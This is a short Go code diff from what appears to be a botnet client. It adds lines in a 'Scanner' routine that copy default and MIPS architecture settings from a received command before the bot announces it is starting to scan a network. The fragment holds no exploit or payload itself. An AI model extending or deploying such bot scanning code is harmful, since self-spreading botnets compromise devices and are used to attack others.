@@ -330,6 +330,8 @@ func (b *Bot) Scanner() {
 				multiCores := "[" + strconv.Itoa(b.CPU) + "] CORES"
 				coreReport = &multiCores
 			}
+			b.DefaultArch = setCall.CallBot.DefaultArch
+			b.MipsArch = setCall.CallBot.MipsArch
 
 			b.Report(*coreReport + " START SCANNING ON " +
 				value.scanOptFull + " NETWORK...")
